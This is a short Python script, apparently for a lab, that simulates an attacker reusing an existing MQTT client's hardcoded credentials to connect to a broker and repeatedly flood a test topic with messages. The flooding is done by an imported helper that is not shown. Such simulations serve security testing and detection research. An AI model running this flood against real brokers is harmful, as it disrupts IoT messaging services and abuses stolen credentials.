import time
import mqtt_utilities as util
import paho.mqtt.client as mqtt

topic = "test/topic1"
username = "client2"
password = "pass2"
reconnect_delay = 10
local_ip_address = util.get_local_ip()
connection = util.Connection_status()

# the attacker uses an existing client to connect to the broker and spam messages to the selected topic
while True:
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata=connection, protocol=mqtt.MQTTv5)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_publish = util.on_publish
    if util.connect_client(client, connection, reconnect_delay):
        util.spam_messages(client, topic, 0.01, ip_adress=local_ip_address)
    else:
        print(f"Retrying connection in {reconnect_delay} seconds...")
        time.sleep(reconnect_delay)
